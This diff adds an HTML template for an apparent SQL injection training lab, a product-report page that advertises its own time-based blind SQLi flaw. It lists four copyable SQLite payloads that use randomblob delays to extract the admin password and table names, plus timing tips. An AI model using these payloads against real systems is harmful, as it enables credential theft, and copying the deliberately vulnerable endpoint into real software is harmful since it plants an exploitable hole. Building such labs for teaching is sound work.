@@ -1,0 +1,86 @@
+{% extends "base.html" %}
+
+{% block title %}Report - SQL Injection Lab{% endblock %}
+
+{% block content %}
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">⏱️ Product Report</span>
+        <span class="badge badge-danger">Vulnerable: Time-Based Blind SQLi</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">
+        This endpoint is vulnerable to <strong>Time-Based Blind SQL Injection</strong>.
+        SQLite uses <code>randomblob(N)</code> to cause measurable delays. Attackers use response timing to infer conditions.
+    </p>
+    <form method="GET" action="{{ url_for('report') }}">
+        <div style="display: flex; gap: 12px;">
+            <input type="text" name="id" value="{{ product_id }}" placeholder="Product ID..." style="flex: 1;">
+            <button type="submit" class="btn btn-primary">Generate Report</button>
+        </div>
+    </form>
+    {% if executed_query %}
+    <div class="query-box">
+        <span class="label">Executed SQL Query</span>
+        <code>{{ executed_query }}</code>
+    </div>
+    {% endif %}
+    <div style="display: flex; gap: 16px; margin: 16px 0;">
+        <div style="flex: 1; background: var(--bg); padding: 16px; border-radius: 8px; text-align: center;">
+            <div style="font-size: 24px; font-weight: 700; color: var(--accent);">{{ elapsed_time }}s</div>
+            <div style="font-size: 12px; color: var(--text-muted); margin-top: 4px;">Response Time</div>
+        </div>
+    </div>
+    {% if error %}
+        <div class="alert alert-danger">{{ error }}</div>
+    {% endif %}
+    {% if result %}
+    <div class="card" style="background: rgba(88, 166, 255, 0.05);">
+        <table class="data-table">
+            <tr><td style="width: 120px; color: var(--text-muted);">ID</td><td>{{ result.id }}</td></tr>
+            <tr><td style="color: var(--text-muted);">Name</td><td>{{ result.name }}</td></tr>
+            <tr><td style="color: var(--text-muted);">Description</td><td>{{ result.description }}</td></tr>
+            <tr><td style="color: var(--text-muted);">Price</td><td>${{ result.price }}</td></tr>
+            <tr><td style="color: var(--text-muted);">Category</td><td>{{ result.category }}</td></tr>
+            <tr><td style="color: var(--text-muted);">Stock</td><td>{{ result.stock }}</td></tr>
+        </table>
+    </div>
+    {% elif not error %}
+        <div class="alert alert-info">No product found with ID: {{ product_id }}</div>
+    {% endif %}
+</div>
+
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">💉 Time-Based Blind SQLi Payloads</span>
+        <span class="badge badge-warning">Click to copy</span>
+    </div>
+    <div class="payload">
+        <div class="payload-label">Cause delay if admin password starts with 'a' (~2-5s delay)</div>
+        1 AND (SELECT CASE WHEN (substr((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN randomblob(1000000000) ELSE 1 END)
+    </div>
+    <div class="payload">
+        <div class="payload-label">Heavy delay for True condition</div>
+        1 AND (SELECT CASE WHEN (SELECT count(*) FROM users WHERE role='admin') > 0 THEN randomblob(500000000) ELSE 1 END)
+    </div>
+    <div class="payload">
+        <div class="payload-label">Check password length with timing</div>
+        1 AND (SELECT CASE WHEN (length((SELECT password FROM users WHERE username='admin')) > 5) THEN randomblob(1000000000) ELSE 1 END)
+    </div>
+    <div class="payload">
+        <div class="payload-label">Enumerate database name character by character</div>
+        1 AND (SELECT CASE WHEN (substr((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),1,1)='u') THEN randomblob(1000000000) ELSE 1 END)
+    </div>
+</div>
+
+<div class="card" style="border-color: var(--info);">
+    <div class="card-header">
+        <span class="card-title" style="color: var(--info);">⚠️ Important Notes</span>
+    </div>
+    <ul style="padding-left: 20px; color: var(--text-muted); font-size: 13px; line-height: 1.8;">
+        <li>SQLite lacks <code>SLEEP()</code> — we use <code>randomblob(N)</code> as alternative</li>
+        <li>Adjust <code>randomblob()</code> size based on your system's memory and CPU</li>
+        <li>Very large values may cause timeouts — start small (1000000)</li>
+        <li>Network latency can affect timing — test from localhost for consistency</li>
+    </ul>
+</div>
+{% endblock %}
